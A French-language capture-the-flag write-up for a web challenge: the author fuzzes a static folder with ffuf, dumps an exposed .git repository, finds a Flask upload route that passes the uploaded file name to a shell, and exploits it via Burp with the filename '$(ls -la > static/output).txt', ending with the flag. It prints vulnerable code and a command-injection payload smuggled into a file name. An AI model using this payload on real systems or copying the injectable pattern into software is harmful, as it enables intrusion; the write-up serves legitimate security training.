## Description
You are Blind but you aren't Deaf. 
Links : https://fcc-web03.chals.io/

## Solution
Dans ce challenge, on a un site web devant nous qui es un site bootstrap.
Donc j'ai d'abord commencer a `Fuzz` les directory sur le `/` mais aucune resulats avec ca, alors j'ai donc inspecter le code source du site web pour avoir quelque informations

![Le Code Source](https://i.ibb.co/L938yvB/p1.png)

Dans ce code source, on vois plusieurs links specificient le `static` comme :
` <link href="static/css/bootstrap-icons.css"`
`<link href="static/css/styles.css" rel="stylesheet" />`
Donc ce que j'ai essayer est de faire du Fuzzing sur Path. Pour ca je vais donc utiliser `ffuf`

```terminal
└─# ffuf -u "https://fcc-web03.chals.io/static/FUZZ" -w /usr/share/wordlists/dirb/common.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : https://fcc-web03.chals.io/static/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

.git/HEAD               [Status: 200, Size: 21, Words: 2, Lines: 2, Duration: 890ms]
flag					[Status: 200, Size: 21, Words: 2, Lines: 1, Duration: 890ms]
```
Interessant, on viens d'avoir un `.git` qui est tres sensitive et aussi un fichier `flag` mais qui etait vide. Donc j'ai proceder pour dumper le `.git` avec l'outil `GitTool` disponible sur Github.
Apres le dump, je trouve 4 Directory.
```
└─# ls
0-160bb136268fbcf7866da3c8625e60e5580d0185  2-9e3ed36dad27c4c7929d51b4c45ea52845bce385
1-2069e965b51e1c7b7974d90441da243dd449fb91  3-01335bb7ecb24bdb68fea92059de29ea4c290631
```
Avec la commande `ls *` on a :
```terminal
└─# ls *  
0-160bb136268fbcf7866da3c8625e60e5580d0185:
app.py  commit-meta.txt  static  templates

1-2069e965b51e1c7b7974d90441da243dd449fb91:
app.py  commit-meta.txt  static  templates

2-9e3ed36dad27c4c7929d51b4c45ea52845bce385:
app.py  commit-meta.txt  static  templates

3-01335bb7ecb24bdb68fea92059de29ea4c290631:
app.py  commit-meta.txt  static  templates
```
D'ici le plus important c'est `app.py` qui es le code de l'application, on va donc afficher tous pour voir.

```terminal
└─# cat */*.py  
from flask import Flask, render_template, request, redirect, url_for
import subprocess, os

UPLOAD_FOLDER = 'uploads'
ALLOWED_EXTENSIONS = {'txt', 'pdf', 'png', 'jpg', 'jpeg', 'gif'}
app = Flask(__name__)

app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER


@app.route("/")
def home():
        return render_template("index.html")

def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS


@app.route("/fil3_Upl0ad3r",  methods=['GET', 'POST'])
def files():
        if request.method == 'POST':
                if 'file' not in request.files:
                        flash('No file part')
                        return redirect(url_for('home'))
                file = request.files['file']
                if file.filename == '':
                        flash('No selected file')
                        return redirect(request.url)
                if file and allowed_file(file.filename):
                        ext=file.filename.rsplit('.', 1)[1].lower() 
                        command = 'echo "'+file.filename+'"' + ' | sha1sum'
                        sha1sum=subprocess.run(command, shell=True, check=True, universal_newlines=True, stdout=subprocess.PIPE).stdout
                        file.save(os.path.join(app.config['UPLOAD_FOLDER'], sha1sum+'.'+ext))
                        return redirect(url_for('home'))
        return '''
        <!doctype html>
        <title>Upload new File</title>
        <h1>Upload new File</h1>
        <form method=post enctype=multipart/form-data>
        <input type=file name=file>
        <input type=submit value=Upload>
        </form>
        '''
```
A l'interieur des `app.py` je trouve ce code qui es interessant. On a une declaration d'une route ici `fil3_Upl0ad3r`.
Dans ce directory je trouve un file uploader avec que les extension qui sont autorisees ici : 
`ALLOWED_EXTENSIONS = {'txt', 'pdf', 'png', 'jpg', 'jpeg', 'gif'}`
 Le petit truc que j'ai reussi a comprendre dans ce code est que:

- `command = 'echo "'+file.filename+'"' + ' | sha1sum'`: Une injection de code est possible au moment ou notre fichier doit etre converti en `sha1`.
D'ici ce qu'on peux faire est de ajouter le code qu'on veux executer a notre fichier.
Exemple dans notre Terminal si on se fait
```terminal
┌──(root㉿1337)-[/home/bloman/CTFs/FCC_CTF/files]
└─# filename="$(whoami)" 
                                                                                                    
┌──(root㉿1337)-[/home/bloman/CTFs/FCC_CTF/files]
└─# echo $filename
root
```
Comme on vois ici bien que ca nous a renvoyer la reponse du `whoami`.
Un second exemple ici:
```
┌──(root㉿1337)-[/home/bloman/CTFs/FCC_CTF/files]
└─# filename="$(id;hostnamectl)"
                                                                                                    
┌──(root㉿1337)-[/home/bloman/CTFs/FCC_CTF/files]
└─# echo $filename
uid=0(root) gid=0(root) groups=0(root)
 Static hostname: 1337
       Icon name: computer-laptop
         Chassis: laptop 💻
      Machine ID: 5b6e1889fbdb4bcc88d63eabf7e2110b
         Boot ID: 311a265af1064740b41b87752ce5fd70
Operating System: Kali GNU/Linux Rolling
          Kernel: Linux 6.0.0-kali3-amd64
    Architecture: x86-64
 Hardware Vendor: Hewlett-Packard
  Hardware Model: HP EliteBook Folio 9470m
Firmware Version: 68IBD Ver. F.48
   Firmware Date: Mon 2014-01-13
    Firmware Age: 9y 10month 1w 4d
```
comme on vois la meme chose ici, nos commandes sont bien executer, Donc on va essayer les memes methodes dans le site.
Pour le faire, j'ai utiliser BurpSuite pour modifier les requetes.
J'ai dabord upload un fichier `.txt` et j'ai amener la requete dans le `Repeater`.
Une chose a se rappeler est qu'on a seulement l'access au Directory `static`.
Donc j'ai modifie le nom de mon fichier par:
```
-----------------------------376817465030656881942450160489
Content-Disposition: form-data; name="file"; filename="$(ls -la > static/output).txt"
```
Quand je l'ai envoyer, j'ai une redirection, ce qui veux dire que ca a bien marcher et qu'on a bien inject.
Maintenant allons voir notre `output`

![Success](https://i.ibb.co/JzFNMXf/hacked.png)

Maintenant on a juste a afficher le flag avec la meme Methode.
`FCC{aa44a76888eae0ae250117ac0bb5abaf5ee3fdb2869a31c13ccb49dcaed27aab}`
Merci.
